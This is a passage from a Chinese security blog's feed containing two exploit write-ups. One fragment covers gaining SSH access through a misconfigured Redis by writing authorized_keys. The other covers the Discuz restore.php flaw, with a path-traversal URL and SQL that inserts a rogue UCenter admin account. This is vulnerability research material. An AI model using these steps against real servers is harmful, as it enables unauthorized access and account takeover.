class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p><p>然后就可以使用ssh的公钥登录了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i redis.pub root@192.168.192.133</span><br></pre></td></tr></table></figure></p><h3 id="0x02-不存在-ssh目录"><a href="#0x02-不存在-ssh目录" class="headerlink" title="0x02 不存在.ssh目录"></a>0x02 不存在.ssh目录</h3><p>当目标服务器上不存在.ssh目录时，Redis是无法创建该目录的，所以可以通过写入crontab的方式来达到命令执行，并反弹shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;配置错误的Redis可通过将公钥写入.ssh/authorized_keys，使攻击者拿到服务器权限
      
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Linux" scheme="http://blog.smilent.me/tags/Linux/"/>
    
      <category term="Redis" scheme="http://blog.smilent.me/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Discuz restore vulnerability</title>
    <link href="http://blog.smilent.me/2015-10-16-discuz-utility-restore-vulnerability.html"/>
    <id>http://blog.smilent.me/2015-10-16-discuz-utility-restore-vulnerability.html</id>
    <published>2015-10-15T16:00:00.000Z</published>
    <updated>2016-06-04T04:07:27.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>restore.php 是discuz官方提供的数据恢复，该工具中存在一个可以恢复任意sql文件的漏洞，从而可以造成插入ucenter管理员帐户，获取uckey，甚至getshell的情况。<br><img src="http://smilent-typecho.stor.sinaapp.com/1152864778.png" alt="d1.png"></p><h3 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h3><p>漏洞出现在<br><a href="http://localhost/utility/restore.php?operation=importzip&amp;datafile_server={file_path}" target="_blank" rel="noopener">http://localhost/utility/restore.php?operation=importzip&amp;datafile_server={file_path}</a><br>文件<code>/utility/restore.php</code> 142 行开始，importzip 逻辑中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//line 157</span></span><br><span class="line">$backupdir = substr($datafile_server, <span class="number">8</span>, <span class="number">13</span>);</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="comment">// line 173 </span></span><br><span class="line"><span class="keyword">foreach</span>($unzip-&gt;Entries <span class="keyword">as</span> $entry) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\.sql$/i"</span>, $entry-&gt;Name)) &#123;</span><br><span class="line">$fp = fopen(<span class="string">'../data/'</span>.$backupdir.<span class="string">'/'</span>.$entry-&gt;Name, <span class="string">'w'</span>);</span><br><span class="line">var_dump($fp);</span><br><span class="line">fwrite($fp, $entry-&gt;Data);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sqlfilecount++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="comment">//line 118</span></span><br><span class="line">show_msg(<span class="string">'database_import_multivol_confirm'</span>, $siteurl.<span class="string">'restore.php?operation=import&amp;datafile_server='</span>.$datafile_vol1.<span class="string">'&amp;importsubmit=yes&amp;delunzip=yes'</span>, <span class="string">'confirm'</span>);</span><br></pre></td></tr></table></figure></p><p>该语句将zip中的.sql文件解压出来。 写到/data目录下。我们可以看到backupdir的值其实是可控的。他是截取datafile_server第9到第14个字符。那么我们传递构造./的方式使路径可控在/data目录下。<br><a id="more"></a><br>程序走到 118行，将解压出来的文件交给 import 逻辑中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//line 92</span></span><br><span class="line"><span class="keyword">foreach</span>($sqlquery <span class="keyword">as</span> $sql) &#123;</span><br><span class="line"></span><br><span class="line">$sql = syntablestruct(trim($sql), $db-&gt;version() &gt; <span class="string">'4.1'</span>, DBCHARSET);</span><br><span class="line"><span class="comment">//die(var_dump($sql));</span></span><br><span class="line"><span class="keyword">if</span>($sql != <span class="string">''</span>) &#123;</span><br><span class="line">    $db-&gt;query($sql, <span class="string">'SILENT'</span>);</span><br><span class="line">    <span class="comment">//die(var_dump($db));</span></span><br><span class="line">    <span class="keyword">if</span>(($sqlerror = $db-&gt;error()) &amp;&amp; $db-&gt;errno() != <span class="number">1062</span>) &#123;</span><br><span class="line">$db-&gt;halt(<span class="string">'MySQL Query Error'</span>, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 ，程序执行了从.sql文件中读取出来的SQL语句。</p><h3 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h3><p>首先我们需要上传一个zip文件，但是有些站长并没有开启上传zip的功能，所以我们可以构造一个带有zip文件的图片，从而达到上传zip的目的。<br><img src="http://smilent-typecho.stor.sinaapp.com/650122667.png" alt="d2.png"><br>我们上传图片，然后得到路径。然后构造。<code>datafile_server=../././././././././././././././././data/attachment/forum/201510/12/165500vfnjdnqrqapqnqen.jpg</code><br>访问<code>http://localhost/utility/restore.php?operation=importzip&amp;datafile_server=../././././././././././././././././data/attachment/forum/201510/12/165500vfnjdnqrqapqnqen.jpg</code>即可恢复数据。<br>其中可以写入一下两条 来创建一个ucenter的管理员帐户。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`pre_ucenter_admins`</span> (<span class="string">`uid`</span>, <span class="string">`username`</span>, <span class="string">`allowadminsetting`</span>, <span class="string">`allowadminapp`</span>, <span class="string">`allowadminuser`</span>, <span class="string">`allowadminbadword`</span>, <span class="string">`allowadmintag`</span>, <span class="string">`allowadminpm`</span>, <span class="string">`allowadmincredits`</span>, <span class="string">`allowadmindomain`</span>, <span class="string">`allowadmindb`</span>, <span class="string">`allowadminnote`</span>, <span class="string">`allowadmincache`</span>, <span class="string">`allowadminlog`</span>) <span class="keyword">VALUES</span>(<span class="number">123456</span>, <span class="string">'smilent'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`pre_ucenter_members`</span> (<span class="string">`uid`</span>, <span class="string">`username`</span>, <span class="string">`password`</span>, <span class="string">`email`</span>, <span class="string">`myid`</span>, <span class="string">`myidkey`</span>, <span class="string">`regip`</span>, <span class="string">`regdate`</span>, <span class="string">`lastloginip`</span>, <span class="string">`lastlogintime`</span>, <span class="string">`salt`</span>, <span class="string">`secques`</span>) <span class="keyword">VALUES</span> (<span class="number">123456</span>, <span class="string">'smilent'</span>, <span class="string">'e294305468a5531f74613f48fec87f31'</span>, <span class="string">'admin@admin.com'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'hidden'</span>, <span class="number">1444635858</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">'2dabff'</span>, <span class="string">''</span>); //pass: admin</span><br></pre></td></tr></table></figure></p><p>然后进入后台 拿到uckey。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h3&gt;&lt;p&gt;restore.php 是discuz官方提供的数据恢复，该工具中存在一个可以恢复任意sql文件的漏洞，从而可以造成插入ucenter管理员帐户，获取uckey，甚至getshell的情况。&lt;br&gt;&lt;img src=&quot;http://smilent-typecho.stor.sinaapp.com/1152864778.png&quot; alt=&quot;d1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h3&gt;&lt;p&gt;漏洞出现在&lt;br&gt;&lt;a href=&quot;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&lt;/a&gt;&lt;br&gt;文件&lt;code&gt;/utility/restore.php&lt;/code&gt; 142 行开始，importzip 逻辑中。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 157&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$backupdir = substr($datafile_server, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// line 173 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($unzip-&amp;gt;Entries &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $entry) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/\.sql$/i&quot;&lt;/span&gt;, $entry-&amp;gt;Name)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			$fp = fopen(&lt;span class=&quot;string&quot;&gt;&#39;../data/&#39;&lt;/span&gt;.$backupdir.&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.$entry-&amp;gt;Name, &lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			var_dump($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			fwrite($fp, $entry-&amp;gt;Data);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			fclose($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			$sqlfilecount++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 118&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show_msg(&lt;span class=&quot;string&quot;&gt;&#39;database_import_multivol_confirm&#39;&lt;/span&gt;, $siteurl.&lt;span class=&quot;string&quot;&gt;&#39;restore.php?operation=import&amp;amp;datafile_server=&#39;&lt;/span&gt;.$datafile_vol1.&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;importsubmit=yes&amp;amp;delunzip=yes&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;该语句将zip中的.sql文件解压出来。 写到/data目录下。我们可以看到backupdir的值其实是可控的。他是截取datafile_server第9到第14个字符。那么我们传递构造./的方式使路径可控在/data目录下。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="SQLi" scheme="http://blog.smilent.me/tags/SQLi/"/>
    
  </entry>
  
</feed>
